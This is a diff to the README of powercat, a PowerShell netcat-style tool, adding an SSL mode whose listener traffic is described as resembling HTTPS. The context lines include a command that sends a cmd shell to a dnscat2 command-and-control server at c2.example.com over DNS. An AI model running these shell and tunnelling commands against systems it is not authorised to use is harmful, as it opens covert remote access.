@@ -21,6 +21,7 @@ powercat is a powershell function.  First you need to load the function before y
     -u      Transfer data over UDP.                              [Switch]
     -dns    Transfer data over dns (dnscat2).                    [String]
     -dnsft  DNS Failure Threshold.                               [int32]
+    -ssl    SSL mode                                             [String]
     -t      Timeout option. Default: 60                          [int32]
     -i      Input: Filepath (string), byte array, or string.     [object]
     -o      Console Output Type: "Host", "Bytes", or "String"    [String]
@@ -73,6 +74,15 @@ powercat supports more than sending data over TCP. Specify -u to enable UDP Mode
         powercat -c 10.1.1.1 -p 53 -dns c2.example.com
     Send a shell to the c2.example.com dnscat2 server using the default DNS server in Windows:
         powercat -dns c2.example.com -e cmd
+
+SSL
+---
+powercat also support SSL over TCP, making a connection that appears similar to HTTPS traffic.  Certificate names must match, and the listener generates a self-signed certificate on the fly.
+###
+    Open a SSL Listener
+	    powercat -l -p 443 -s mycertname
+    Connect to a SSL listener
+        powercat -c 10.1.1.1 -p 443 -s mycertname
 
 Relays
 ------
